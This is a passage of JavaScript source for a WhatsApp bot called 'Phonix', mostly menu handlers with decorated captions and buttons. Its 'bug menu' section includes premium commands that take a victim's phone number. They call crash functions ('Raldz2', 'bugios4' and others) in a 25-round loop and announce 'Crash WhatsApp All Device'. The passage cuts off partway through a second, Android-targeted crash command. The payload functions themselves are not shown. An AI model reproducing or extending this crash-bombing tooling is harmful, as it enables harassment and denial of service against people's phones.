➢ 𝐍𝐚𝐦𝐞 𝐁𝐨𝐭 : *Phonix*
➣ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐢𝐨𝐧 : *2*
➣ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : *9*
➢ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *RaldzzXyz*
➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭

*『 𝗔𝗟𝗟 𝗠𝗘𝗡𝗨 』*

⚙️ 𖣯   ➮ .ꜱᴇᴛᴛɪɴɢᴍᴇɴᴜ
🦠 𖣯   ➮ .ʙᴜɢᴍᴇɴᴜ
👑 𖣯   ➮ .ᴛʜᴀɴᴋꜱᴛᴏ
✨ 𖣯   ➮ .ᴛᴏᴏʟsᴍᴇɴᴜ
👥 𖣯   ➮ .ɢʀᴏᴜᴘᴍᴇɴᴜ`

 const buttons = [
  {
    buttonId: '.developer',
    buttonText: {
      displayText: '𝐂͢͢͢𝐫͡𝐞͢͢͢𝐝𝐢͜𝐭'
    }
  },
  {
    buttonId: '.thanksto',
    buttonText: {
      displayText: '𝐓͢͢͢𝐡𝐚͜͡𝐧𝐤𝐬͜𝐓𝐨͢'
    }
  }
];

const buttonMessage = {
  image: { url: "https://files.catbox.moe/mkvy68.png" },
  caption: allmenu,
  footer: '© RaldzzXyz\n',
  buttons: buttons,
  headerType: 6,
  contextInfo: { 
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363330344810280@newsletter",
      serverMessageId: null,
      newsletterName: `</> 𝐏𝐡𝐨𝐧𝐢𝐱 - 𝐑𝐚𝐥𝐝𝐳𝐳 </>`
    },
    mentionedJid: ['6285141370204@s.whatsapp.net'],
  },
  viewOnce: true
};

const listMes = [
  {
    buttonId: 'action',
    buttonText: { displayText: 'Options' },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: "𝐒𝐄𝐋𝐄𝐂𝐓",
        sections: [
          {
            title: "𝗦𝗲𝗹𝗲𝗰𝘁 𝗧𝗵𝗶𝘀 𝗢𝗽𝘁𝗶𝗼𝗻𝘀",
            highlight_label: "",
            rows: [
              {
                header: "𝐁𝐮𝐠 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".bugmenu"
              },
              {
                header: "𝐓𝐨𝐨𝐥𝐬 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".toolsmenu"
              },
              {
                header: "𝐆𝐫𝐨𝐮𝐩 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".groupmenu"
              },
              {
                header: "𝐒𝐞𝐭𝐭𝐢𝐧𝐠 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".settingmenu"
              }
            ]
          }
        ]
      })
    },
    viewOnce: true
  }
];

buttonMessage.buttons.push(...listMes);

return await conn.sendMessage(m.chat, buttonMessage, { quoted: glxNull });
}
break;

case 'bugmenu':{
if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
let bakyatim = `
*\`⫸☠️ ⟬     𝐏͢𝐇͜͡𝚯͜𝚴͢𝐈͜͡𝐗     ⟭ ☠️⫷\`*

*『 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓 』*
➢ 𝐍𝐚𝐦𝐞 𝐁𝐨𝐭 : *Phonix*
➣ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐢𝐨𝐧 : *2*
➣ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : *9*
➢ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *RaldzzXyz*
➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭

*『 𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 』*

 ▢ .xᴘᴄʀᴀsʜ`
 
const buttons = [
  {
    buttonId: '.developer',
    buttonText: {
      displayText: '𝐂͢͢͢𝐫͡𝐞͢͢͢𝐝𝐢͜𝐭'
    }
  },
  {
    buttonId: '.thanksto',
    buttonText: {
      displayText: '𝐓͢͢͢𝐡𝐚͜͡𝐧𝐤𝐬͜𝐓𝐨͢'
    }
  }
];

const buttonMessage = {
  image: { url: "https://files.catbox.moe/mkvy68.png" },
  caption: bakyatim,
  footer: '© RaldzzXyz\n',
  buttons: buttons,
  headerType: 6,
  contextInfo: { 
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363330344810280@newsletter",
      serverMessageId: null,
      newsletterName: `</> 𝐏𝐡𝐨𝐧𝐢𝐱 - 𝐑𝐚𝐥𝐝𝐳𝐳 </>`
    },
    mentionedJid: ['6285141370204@s.whatsapp.net'],
  },
  viewOnce: true
};

const listMes = [
  {
    buttonId: 'action',
    buttonText: { displayText: 'Options' },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: "𝐒𝐄𝐋𝐄𝐂𝐓",
        sections: [
          {
            title: "𝗦𝗲𝗹𝗲𝗰𝘁 𝗧𝗵𝗶𝘀 𝗢𝗽𝘁𝗶𝗼𝗻𝘀",
            highlight_label: "",
            rows: [
              {
                header: "𝐁𝐮𝐠 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".bugmenu"
              },
              {
                header: "𝐓𝐨𝐨𝐥𝐬 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".toolsmenu"
              },
              {
                header: "𝐆𝐫𝐨𝐮𝐩 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".groupmenu"
              },
              {
                header: "𝐒𝐞𝐭𝐭𝐢𝐧𝐠 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".settingmenu"
              }
            ]
          }
        ]
      })
    },
    viewOnce: true
  }
];

buttonMessage.buttons.push(...listMes);

return await conn.sendMessage(m.chat, buttonMessage, { quoted: glxNull });
}
break;                       

 
case 'groupmenu':{
if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
let grup = `
*\`⫸☠️ ⟬     𝐏͢𝐇͜͡𝚯͜𝚴͢𝐈͜͡𝐗     ⟭ ☠️⫷\`*

*『 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓 』*
➢ 𝐍𝐚𝐦𝐞 𝐁𝐨𝐭 : *Phonix*
➣ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐢𝐨𝐧 : *2*
➣ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : *9*
➢ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *RaldzzXyz*
➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭

*『 𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨 』*
 ▢ .ᴏᴘᴇɴ
 ▢ .ᴄʟᴏsᴇ
 ▢ .ʜɪᴅᴇᴛᴀɢ
 ▢ .ᴛᴀɢᴀʟʟ
 ▢ .ᴘʀᴏᴍᴏᴛᴇ
 ▢ .ᴅᴇᴍᴏᴛᴇ
 ▢ .ᴋɪᴄᴋ
 ▢ .ᴀɴᴛɪʟɪɴᴋ ᴏɴ/ᴏғғ
 ▢ .ᴛᴀɢᴍᴇ`

const buttons = [
  {
    buttonId: '.developer',
    buttonText: {
      displayText: '𝐂͢͢͢𝐫͡𝐞͢͢͢𝐝𝐢͜𝐭'
    }
  },
  {
    buttonId: '.thanksto',
    buttonText: {
      displayText: '𝐓͢͢͢𝐡𝐚͜͡𝐧𝐤𝐬͜𝐓𝐨͢'
    }
  }
];

const buttonMessage = {
  image: { url: "https://files.catbox.moe/mkvy68.png" },
  caption: grup,
  footer: '© RaldzzXyz\n',
  buttons: buttons,
  headerType: 6,
  contextInfo: { 
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363330344810280@newsletter",
      serverMessageId: null,
      newsletterName: `</> 𝐏𝐡𝐨𝐧𝐢𝐱 - 𝐑𝐚𝐥𝐝𝐳𝐳 </>`
    },
    mentionedJid: ['6285141370204@s.whatsapp.net'],
  },
  viewOnce: true
};

const listMes = [
  {
    buttonId: 'action',
    buttonText: { displayText: 'Options' },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: "𝐒𝐄𝐋𝐄𝐂𝐓",
        sections: [
          {
            title: "𝗦𝗲𝗹𝗲𝗰𝘁 𝗧𝗵𝗶𝘀 𝗢𝗽𝘁𝗶𝗼𝗻𝘀",
            highlight_label: "",
            rows: [
              {
                header: "𝐁𝐮𝐠 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".bugmenu"
              },
              {
                header: "𝐓𝐨𝐨𝐥𝐬 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".toolsmenu"
              },
              {
                header: "𝐒𝐞𝐭𝐭𝐢𝐧𝐠 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".groupmenu"
              },
              {
                header: "𝐒𝐞𝐭𝐭𝐢𝐧𝐠 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".settingmenu"
              }
            ]
          }
        ]
      })
    },
    viewOnce: true
  }
];

buttonMessage.buttons.push(...listMes);

return await conn.sendMessage(m.chat, buttonMessage, { quoted: glxNull });
}
break;                       

case 'toolsmenu':{
if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
let tools = `
*\`⫸☠️ ⟬     𝐏͢𝐇͜͡𝚯͜𝚴͢𝐈͜͡𝐗     ⟭ ☠️⫷\`*

*『 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓 』*
➢ 𝐍𝐚𝐦𝐞 𝐁𝐨𝐭 : *Phonix*
➣ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐢𝐨𝐧 : *2*
➣ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : *9*
➢ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *RaldzzXyz*
➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭

*『 𝗧𝗢𝗢𝗟𝗦 𝗠𝗘𝗡𝗨 』*

* INTERACT PHOTO
 ▢ .ʀᴠᴏ
 
* STIKER
 ▢ .ʙʀᴀᴛ
 ▢ .sᴛɪᴄᴋᴇʀ
 ▢ .ᴛᴇʟᴇsᴛɪᴄᴋ
 ▢ .sᴛᴇxᴛ
 ▢ .ǫᴄ

* ANOMALY
 ▢ .sᴘᴀᴍ-ɴɢʟ
 ▢ .ᴛᴏᴠɴ
 ▢ .ɢᴇᴛ
 ▢ .ᴘɪɴᴛᴇʀᴇsᴛ
 ▢ .ᴛᴏᴜʀʟ
 ▢ .ᴛᴏɪᴍɢ

* ARTIFICIAL INTELEGENT
 ▢ .ᴠᴏᴄᴀʟ
 ▢ .ʀᴇᴍɪɴɪ
 ▢ .ᴏᴘᴇɴᴀɪ
 ▢ .ᴀɪ
 ▢ .ɢᴇᴍɪɴɪ
 ▢ .ᴄʜᴀᴛɢᴘᴛ

* AUDIO
 ▢ .ʙᴀss
 ▢ .ʙʟᴏᴡɴ
 ▢ .ᴅᴇᴇᴘ
 ▢ .ᴇᴀʀʀᴀᴘᴇ
 ▢ .ғᴀsᴛ
 ▢ .ғᴀᴛ
 ▢ .ɴɪɢʜᴛᴄᴏʀᴇ
 ▢ .ʀᴇᴠᴇʀsᴇ
 ▢ .ʀᴏʙᴏᴛ
 ▢ .sʟᴏᴡ
 ▢ .sᴍᴏᴏᴛʜ
 ▢ .ᴛᴜᴘᴀɪ

* FUN
 ▢ .ᴄᴇᴋᴋʜᴏᴅᴀᴍ
 ▢ .ᴀᴘᴀᴋᴀʜ
 ▢ .ʙɪsᴀᴋᴀʜ
 ▢ .ʙᴀɢᴀɪᴍᴀɴᴀᴋᴀʜ
 ▢ .ᴄᴇᴋʟɪᴍɪᴛ
 ▢ .ᴀғᴋ
 ▢ .ᴊᴏᴅᴏʜ
 ▢ .ᴊᴀᴅɪᴀɴ
 ▢ .ᴄᴇᴋᴘᴀᴄᴀʀ

* JADI BOT
 ▢ .ᴊᴀᴅɪʙᴏᴛ
 ▢ .ʟɪsᴛᴊᴀᴅɪʙᴏᴛ
 ▢ .sᴛᴏᴘᴊᴀᴅɪʙᴏᴛ

* DOWNLOADER
 ▢ .ᴘʟᴀʏ
 ▢ .ғʙᴅʟ
 ▢ .ᴘɪɴᴅʟ
 ▢ .ɪɢᴅʟ
 ▢ .ᴛᴛᴅʟ`

const buttons = [
  {
    buttonId: '.developer',
    buttonText: {
      displayText: '𝐂͢͢͢𝐫͡𝐞͢͢͢𝐝𝐢͜𝐭'
    }
  },
  {
    buttonId: '.thanksto',
    buttonText: {
      displayText: '𝐓͢͢͢𝐡𝐚͜͡𝐧𝐤𝐬͜𝐓𝐨͢'
    }
  }
];

const buttonMessage = {
  image: { url: "https://files.catbox.moe/mkvy68.png" },
  caption: tools,
  footer: '© RaldzzXyz\n',
  buttons: buttons,
  headerType: 6,
  contextInfo: { 
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363330344810280@newsletter",
      serverMessageId: null,
      newsletterName: `</> 𝐏𝐡𝐨𝐧𝐢𝐱 - 𝐑𝐚𝐥𝐝𝐳𝐳 </>`
    },
    mentionedJid: ['6285141370204@s.whatsapp.net'],
  },
  viewOnce: true
};

const listMes = [
  {
    buttonId: 'action',
    buttonText: { displayText: 'Options' },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: "𝐒𝐄𝐋𝐄𝐂𝐓",
        sections: [
          {
            title: "𝗦𝗲𝗹𝗲𝗰𝘁 𝗧𝗵𝗶𝘀 𝗢𝗽𝘁𝗶𝗼𝗻𝘀",
            highlight_label: "",
            rows: [
              {
                header: "𝐁𝐮𝐠 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".bugmenu"
              },
              {
                header: "𝐓𝐨𝐨𝐥𝐬 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".toolsmenu"
              },
              {
                header: "𝐆𝐫𝐨𝐮𝐩 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".groupmenu"
              },
              {
                header: "𝐒𝐞𝐭𝐭𝐢𝐧𝐠 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".settingmenu"
              }
            ]
          }
        ]
      })
    },
    viewOnce: true
  }
];

buttonMessage.buttons.push(...listMes);

return await conn.sendMessage(m.chat, buttonMessage, { quoted: glxNull });
}
break;
 
case 'settingmenu':{
if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
let set = `
*\`⫸☠️ ⟬     𝐏͢𝐇͜͡𝚯͜𝚴͢𝐈͜͡𝐗     ⟭ ☠️⫷\`*

*『 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓 』*
➢ 𝐍𝐚𝐦𝐞 𝐁𝐨𝐭 : *Phonix*
➣ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐢𝐨𝐧 : *2*
➣ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : *9*
➢ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *RaldzzXyz*
➢ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭

*『 𝗦𝗘𝗧𝗧𝗜𝗡𝗚 𝗠𝗘𝗡𝗨 』*

 ▢ .sᴇʟғ
 ▢ .ᴘᴜʙʟɪᴄ
 ▢ .ᴀᴅᴅᴏᴡɴᴇʀ
 ▢ .ᴅᴇʟᴏᴡɴᴇʀ
 ▢ .ᴀᴅᴅᴘʀᴇᴍ
 ▢ .ᴅᴇʟᴘʀᴇᴍ
 ▢ .ʙᴀɴᴜsᴇʀ
 ▢ .ᴜɴʙᴀɴᴅᴜsᴇʀ
 ▢ .ᴅᴇʟᴘʟᴜɢ
 ▢ .ɢᴇᴛᴘʟᴜɢ
 ▢ .ʟɪsᴛᴘʟᴜɢ
 ▢ .ɢᴇᴛǫ
 ▢ .sᴇᴛᴘᴘ`

const buttons = [
  {
    buttonId: '.developer',
    buttonText: {
      displayText: '𝐂͢͢͢𝐫͡𝐞͢͢͢𝐝𝐢͜𝐭'
    }
  },
  {
    buttonId: '.thanksto',
    buttonText: {
      displayText: '𝐓͢͢͢𝐡𝐚͜͡𝐧𝐤𝐬͜𝐓𝐨͢'
    }
  }
];

const buttonMessage = {
  image: { url: "https://files.catbox.moe/mkvy68.png" },
  caption: set,
  footer: '© RaldzzXyz\n',
  buttons: buttons,
  headerType: 6,
  contextInfo: { 
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363330344810280@newsletter",
      serverMessageId: null,
      newsletterName: `</> 𝐏𝐡𝐨𝐧𝐢𝐱 - 𝐑𝐚𝐥𝐝𝐳𝐳 </>`
    },
    mentionedJid: ['6285141370204@s.whatsapp.net'],
  },
  viewOnce: true
};

const listMes = [
  {
    buttonId: 'action',
    buttonText: { displayText: 'Options' },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: "𝐒𝐄𝐋𝐄𝐂𝐓",
        sections: [
          {
            title: "𝗦𝗲𝗹𝗲𝗰𝘁 𝗧𝗵𝗶𝘀 𝗢𝗽𝘁𝗶𝗼𝗻𝘀",
            highlight_label: "",
            rows: [
              {
                header: "𝐁𝐮𝐠 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".bugmenu"
              },
              {
                header: "𝐓𝐨𝐨𝐥𝐬 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".toolsmenu"
              },
              {
                header: "𝐆𝐫𝐨𝐮𝐩 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".groupmenu"
              },
              {
                header: "𝐒𝐞𝐭𝐭𝐢𝐧𝐠 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".settingmenu"
              }
            ]
          }
        ]
      })
    },
    viewOnce: true
  }
];

buttonMessage.buttons.push(...listMes);

return await conn.sendMessage(m.chat, buttonMessage, { quoted: glxNull });
}
break; 

case 'thanksto': case 'tqto': {
if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
let tq = `
*\`⫸☠️ ⟬     𝐏͢𝐇͜͡𝚯͜𝚴͢𝐈͜͡𝐗     ⟭ ☠️⫷\`*

*『 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓 』*
➢ 𝐍𝐚𝐦𝐞 𝐁𝐨𝐭 : *Phonix*
➣ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐢𝐨𝐧 : *2*
➣ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : *9*
➢ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *RaldzzXyz*
➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭

*『 𝗕𝗜𝗚 𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢 』*
 ▢ ⟅ ▿ ⿻ 𝐏‌‌𝐇𝚯‌𝐍‌𝐈𝐗‌ ϟ 𝚫‌𝐆‌𝐄‌‌𝐍‌𝐂𝐘‌ ⿻ ▿ ⟆ 👑
 ▢ RaldzzXyz 👑
 ▢ KyuuRzy 👑
 ▢ Alwaysaqioo 👑
 ▢ HyuuX 👑
 ▢ RadzzTenX 👑
 ▢ RezzX 👑
 ▢ RxhL Official 👑
 ▢ SkyZet 👑
 ▢ Laxy 👑
 ▢ Elmoo 👑
 ▢ Philizya 💞
 ▢ GOD 💎`
const buttons = [
  {
    buttonId: '.developer',
    buttonText: {
      displayText: '𝐂͢͢͢𝐫͡𝐞͢͢͢𝐝𝐢͜𝐭'
    }
  },
  {
    buttonId: '.thanksto',
    buttonText: {
      displayText: '𝐓͢͢͢𝐡𝐚͜͡𝐧𝐤𝐬͜𝐓𝐨͢'
    }
  }
];

const buttonMessage = {
  image: { url: "https://files.catbox.moe/mkvy68.png" },
  caption: tq,
  footer: '© RaldzzXyz\n',
  buttons: buttons,
  headerType: 6,
  contextInfo: { 
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363330344810280@newsletter",
      serverMessageId: null,
      newsletterName: `</> 𝐏𝐡𝐨𝐧𝐢𝐱 - 𝐑𝐚𝐥𝐝𝐳𝐳 </>`
    },
    mentionedJid: ['6285141370204@s.whatsapp.net'],
  },
  viewOnce: true
};

const listMes = [
  {
    buttonId: 'action',
    buttonText: { displayText: 'Options' },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: "𝐒𝐄𝐋𝐄𝐂𝐓",
        sections: [
          {
            title: "𝗦𝗲𝗹𝗲𝗰𝘁 𝗧𝗵𝗶𝘀 𝗢𝗽𝘁𝗶𝗼𝗻𝘀",
            highlight_label: "",
            rows: [
              {
                header: "𝐁𝐮𝐠 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".bugmenu"
              },
              {
                header: "𝐓𝐨𝐨𝐥𝐬 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".toolsmenu"
              },
              {
                header: "𝐆𝐫𝐨𝐮𝐩 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".groupmenu"
              },
              {
                header: "𝐒𝐞𝐭𝐭𝐢𝐧𝐠 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".settingmenu"
              }
            ]
          }
        ]
      })
    },
    viewOnce: true
  }
];

buttonMessage.buttons.push(...listMes);

return await conn.sendMessage(m.chat, buttonMessage, { quoted: glxNull });
}
break;

case 'developer': {
if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
let depeloper = `
*\`⫸☠️ ⟬     𝐏͢𝐇͜͡𝚯͜𝚴͢𝐈͜͡𝐗     ⟭ ☠️⫷\`*

*『 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓 』*
➢ 𝐍𝐚𝐦𝐞 𝐁𝐨𝐭 : *Phonix*
➣ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐢𝐨𝐧 : *2*
➣ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : *9*
➢ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *RaldzzXyz*
➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭

*『 𝗖𝗥𝗘𝗗𝗜𝗧 𝗦𝗖𝗥𝗜𝗣𝗧 』*

 ▢ RaldzzXyz (Creator Script)
 * YouTube : https://youtube.com/@raldzzoffc
 * TikTok : https://tiktok.com/@raldzzxyz_
 * WhatsApp CH : https://whatsapp.com/channel/0029VanySqUBPzjYa2929d0U
 * Instagram : https://instagram.com/@raldzzxyz_
 
 ▢ KyuuRzy (Creator Base)
 * YouTube : https://youtube.com/@kyuurzy
 * GitHub : https://github.com/@kiuur
 * WhatsApp CH : https://whatsapp.com/channel/0029Vask3D80rGiHtQYeeo27
 `

const buttons = [
  {
    buttonId: '.developer',
    buttonText: {
      displayText: '𝐂͢͢͢𝐫͡𝐞͢͢͢𝐝𝐢͜𝐭'
    }
  },
  {
    buttonId: '.thanksto',
    buttonText: {
      displayText: '𝐓͢͢͢𝐡𝐚͜͡𝐧𝐤𝐬͜𝐓𝐨͢'
    }
  }
];

const buttonMessage = {
  image: { url: "https://files.catbox.moe/mkvy68.png" },
  caption: depeloper,
  footer: '© RaldzzXyz\n',
  buttons: buttons,
  headerType: 6,
  contextInfo: { 
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363330344810280@newsletter",
      serverMessageId: null,
      newsletterName: `</> 𝐏𝐡𝐨𝐧𝐢𝐱 - 𝐑𝐚𝐥𝐝𝐳𝐳 </>`
    },
    mentionedJid: ['6285141370204@s.whatsapp.net'],
  },
  viewOnce: true
};

const listMes = [
  {
    buttonId: 'action',
    buttonText: { displayText: 'Options' },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: "𝐒𝐄𝐋𝐄𝐂𝐓",
        sections: [
          {
            title: "𝗦𝗲𝗹𝗲𝗰𝘁 𝗧𝗵𝗶𝘀 𝗢𝗽𝘁𝗶𝗼𝗻𝘀",
            highlight_label: "",
            rows: [
              {
                header: "𝐁𝐮𝐠 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".bugmenu"
              },
              {
                header: "𝐓𝐨𝐨𝐥𝐬 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".toolsmenu"
              },
              {
                header: "𝐆𝐫𝐨𝐮𝐩 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".groupmenu"
              },
              {
                header: "𝐒𝐞𝐭𝐭𝐢𝐧𝐠 ϟ 𝐌𝐞𝐧𝐮",
                title: "",
                description: "",
                id: ".settingmenu"
              }
            ]
          }
        ]
      })
    },
    viewOnce: true
  }
];

buttonMessage.buttons.push(...listMes);

return await conn.sendMessage(m.chat, buttonMessage, { quoted: glxNull });
}
break;                   

// ================= BUG MENU ================= //
case "combinebugxxx":{
if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!isPremium) return reply(mess.premium);

    if (!text) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : .androbugxxx <number> 🎗`);

    const targetId = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
let doneX = `
*\`ᥬ𝐄͢𝐱͠𝐞𝐜͜͡𝐮͢𝐭𝐢𝐯͜͡𝐞 𝐏͢𝐡͠𝐨𝐧͜𝐢𝐱 𝐁͢𝐮͜͡𝐠\`*🩸🐍
⿻ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${targetId}
⿻ 𝗧𝘆𝗽𝗲 : Crash WhatsApp All Device
⿻ 𝗦𝘁𝗮𝘁𝘂𝘀 : Succesfully
`
   try {
    conn.sendMessage(from, {
        image: { url: 'https://files.catbox.moe/w1isit.jpg' },
        caption: doneX,
        footer: "</> 𝘱𝘭𝘦𝘢𝘴𝘦 𝘱𝘢𝘶𝘴𝘦 𝘧𝘰𝘳 15 𝘮𝘪𝘯𝘶𝘵𝘦𝘴 𝘴𝘰 𝘵𝘩𝘢𝘵 𝘵𝘩𝘦 𝘣𝘰𝘵 𝘪𝘴 𝘯𝘰𝘵 𝘣𝘢𝘯𝘯𝘦𝘥",
        buttons: [
            {
                buttonId: "#", 
                buttonText: { displayText: '⟅ ▿ ⿻ 𝐏‌‌𝐇𝚯‌𝐍‌𝐈𝐗‌ ϟ 𝚫‌𝐆‌𝐄‌‌𝐍‌𝐂𝐘‌ ⿻ ▿ ⟆' },
                type: 1
            }
        ],
        contextInfo: {
        externalAdReply: {
            title: "𝐏𝐡𝐨𝐧𝐢𝐱 𝐂𝐫𝐚𝐬𝐡𝐞𝐫",
            body: "sᴜᴄᴄᴇsғᴜʟʟʏ ʙᴜɢ ᴀʟʟ ᴅᴇᴠɪᴄᴇ", 
            thumbnailUrl: "https://files.catbox.moe/w1isit.jpg",
            sourceUrl: "https://youtube.com/@raldzzoffc",
            mediaType: 1,
            renderLargerThumbnail: true
        }
    },
        headerType: 4,
        viewOnce: true
    }, { quoted: glxNull })

        // Eksekusi perulangan
        for (let i = 0; i < 25; i++) {
            await Raldz2(targetId);
            await bugios4(targetId);
            await bugios3(targetId);
            await Raldz4(targetId);
            await sleep(1000)
        }
    } catch (error) {
        console.error("Error saat mengirim bug:", error);
        reply("𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗");
    }
    }
    break;
    
case "androbugxxx":{
if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!isPremium) return reply(mess.premium);

    if (!text) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : .androbugxxx <number> 🎗`);

    const targetId = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
let doneandro = `
*\`ᥬ𝐄͢𝐱͠𝐞𝐜͜͡𝐮͢𝐭𝐢𝐯͜͡𝐞 𝐏͢𝐡͠𝐨𝐧͜𝐢𝐱 𝐁͢𝐮͜͡𝐠\`*🩸🐍
⿻ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${targetId}
⿻ 𝗧𝘆𝗽𝗲 : Crash WhatsApp Android
⿻ 𝗦𝘁𝗮𝘁𝘂𝘀 : Succesfully
`
   try {
    conn.sendMessage(from, {
